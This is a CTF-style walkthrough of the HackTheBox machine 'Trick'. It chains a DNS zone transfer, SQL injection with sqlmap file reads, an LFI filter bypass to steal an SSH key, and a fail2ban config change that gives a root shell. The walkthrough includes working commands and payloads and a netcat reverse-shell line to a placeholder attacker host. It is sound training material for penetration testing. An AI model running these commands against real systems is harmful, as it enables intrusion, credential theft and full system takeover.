---
title: "Trick — HackTheBox Walkthrough"
description: "DNS zone transfer to a hidden vhost, SQL injection and LFI on the payroll app, then fail2ban action.d abuse for root."
date: 2026-09-08
category: offensive
readTime: "12 min read"
mitre:
  - "T1596"
  - "T1590"
  - "T1190"
  - "T1213"
  - "T1552.004"
  - "T1078.002"
  - "T1562.001"
  - "T1548.001"
  - "T1543.002"
tags:
  - "HackTheBox"
  - "HTB"
  - "CPTS"
  - "Linux"
  - "DNS"
  - "Zone Transfer"
  - "SQL Injection"
  - "LFI"
  - "fail2ban"
  - "Privilege Escalation"
summary: "DNS zone transfer to a hidden vhost, SQL injection and LFI on the payroll app, then fail2ban action.d abuse for root."
---

**Machine:** Trick
**OS:** Linux (Debian 10)
**Difficulty:** Easy
**Key Techniques:** DNS AXFR zone transfer, SQL injection auth bypass, MySQL `FILE` read, single-pass filter bypass LFI, SSH key theft, fail2ban `action.d` abuse

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 10000 10.129.53.213
nmap -p 22,25,53,80 -sCV 10.129.53.213
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.9p1 Debian 10+deb10u2 |
| 25 | SMTP | Postfix smtpd (VRFY enabled) |
| 53 | DNS | ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian) |
| 80 | HTTP | nginx 1.14.2 — "Coming Soon - Start Bootstrap Theme" |

### DNS Enumeration

Resolve the PTR for the box, then test for a zone transfer:

```bash
dig +noall +answer @10.129.53.213 -x 10.129.53.213
# trick.htb.

dig +noall +answer @10.129.53.213 axfr trick.htb
# trick.htb.                  A    127.0.0.1
# preprod-payroll.trick.htb.  CNAME trick.htb.
```

The name server permits **AXFR from anyone** — a classic misconfiguration that leaks internal hostnames. Add them to `/etc/hosts`:

```bash
10.129.53.213 trick.htb preprod-payroll.trick.htb
```

### Virtual Host Fuzzing

The public site is a dead-end "Coming Soon" page, but fuzzing the vhost with a `preprod-` pattern reveals a second application:

```bash
wfuzz -u http://10.129.53.213 -H "Host: preprod-FUZZ.trick.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 5480
# 000000254: 200 ... "marketing"  -> preprod-marketing.trick.htb
```

Add `preprod-marketing.trick.htb` to `/etc/hosts` too.

---

## Foothold — SQL Injection on the Payroll App

`preprod-payroll.trick.htb` runs *Employee's Payroll Management System*, an off-the-shelf PHP app vulnerable to **CVE-2022-28468** — a SQL injection in the login form.

### Manual authentication bypass

```
Username: ' or 1=1 -- -
Password: anything
```

This logs in as the Administrator.

### sqlmap via a saved request

Capture the login `POST` as `login.req`, then:

```bash
sqlmap -r login.req --batch --technique B --level 5

sqlmap -r login.req --batch --current-user
# remo@localhost

sqlmap -r login.req --batch --dbs
# information_schema, payroll_db

sqlmap -r login.req --batch -D payroll_db -T users --dump
# Enemigosss : SuperGucciRainbowCake   (does not work for SSH)
```

### Reading files with MySQL `FILE` privileges

Because MySQL runs with `FILE`, sqlmap can read arbitrary local files:

```bash
sqlmap -r login.req --batch --file-read=/etc/passwd
# michael:x:1001:1001::/home/michael:/bin/bash

sqlmap -r login.req --batch --file-read=/etc/nginx/sites-enabled/default
```

The nginx config exposes another vhost rooted at `/var/www/market` whose FastCGI socket (`php7.3-fpm-michael.sock`) confirms the site runs **as michael**:

```bash
sqlmap -r login.req --batch --file-read=/var/www/market/index.php
```

```php
<?php
$file = $_GET['page'];
if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
} else {
   include("/var/www/market/".str_replace("../","",$file));
}
?>
```

---

## Local File Inclusion → Shell as michael

The `str_replace("../","")` filter is **single-pass** — feeding `....//` collapses to `../` after the replacement, bypassing it.

```bash
# Confirm LFI
curl 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd'

# Steal michael's SSH private key
curl 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa' -o michael_rsa
chmod 600 michael_rsa
ssh -i michael_rsa michael@trick.htb
```

Alternative footholds documented for this box:

- **Mail poisoning** — send a PHP payload to michael's local mailbox with `swaks`, then include `/var/mail/michael`.
- **Log poisoning** — inject PHP into the `User-Agent`, then include `/var/log/nginx/access.log`.

```bash
cat ~/user.txt
```

---

## Privilege Escalation — fail2ban `action.d` Abuse

Check sudo rights and group membership:

```bash
sudo -l
# (root) NOPASSWD: /etc/init.d/fail2ban restart

id
# uid=1001(michael) groups=1001(michael),1002(security)

ls -ld /etc/fail2ban/action.d/
# drwxrwx--- 2 root security
```

michael is in the **security** group, which has write access to `/etc/fail2ban/action.d/`, and can restart fail2ban as root. The default ban action is `iptables-multiport` — whose `actionban` directive runs **as root** when a ban fires.

### Weaponize the action

```bash
cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/

sed -i 's|^actionban = .*|actionban = cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash|' \
  /etc/fail2ban/action.d/iptables-multiport.conf

sudo /etc/init.d/fail2ban restart
```

*(A reverse shell via `actionban = nc -e /bin/bash <attacker> 4444` also works.)*

### Trigger the ban

The `sshd` jail bans an IP after a handful of failed logins — brute-force it to fire `actionban`:

```bash
hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://trick.htb
# or: nxc ssh trick.htb -u fakeuser -p /usr/share/wordlists/rockyou.txt
```

```bash
ls -la /tmp/rootbash
/tmp/rootbash -p
root@trick:~# id
uid=0(root) gid=0(root)
root@trick:~# cat /root/root.txt
```

---

## Flags

```bash
cat /home/michael/user.txt
cat /root/root.txt
```

Flag values are unique to each HTB instance and are intentionally omitted.

---

## Lessons Learned

1. **Zone transfers should be restricted.** An open AXFR handed over an internal vhost that was never meant to be public.
2. **Single-pass filters are not filters.** `str_replace("../","")` is trivially bypassed with `....//`.
3. **SQL injection with `FILE` privileges is full filesystem read.** It exposed `/etc/passwd`, the nginx config, and application source in one step.
4. **Group-based write access to service configs is privilege escalation.** `security` owning `fail2ban/action.d` plus `systemctl restart` equals root.
5. **`NOPASSWD` sudo deserves scrutiny.** Restarting a service that reads attacker-writable config is effectively arbitrary code execution as root.
